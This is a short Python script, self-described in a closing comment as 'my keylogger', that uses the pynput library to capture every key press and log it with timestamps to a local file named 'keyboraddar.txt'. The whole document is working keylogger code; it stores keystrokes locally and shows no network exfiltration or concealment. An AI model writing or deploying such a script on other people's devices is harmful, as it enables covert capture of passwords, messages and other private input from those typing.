from pynput.keyboard import Key, Listener
import logging

text=""
logging.basicConfig(filename=(text+"keyboraddar.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
  logging.info(str(key))

with Listener(on_press=on_press) as l:
  l.join()
  #Hello World 
#   this is my keylogger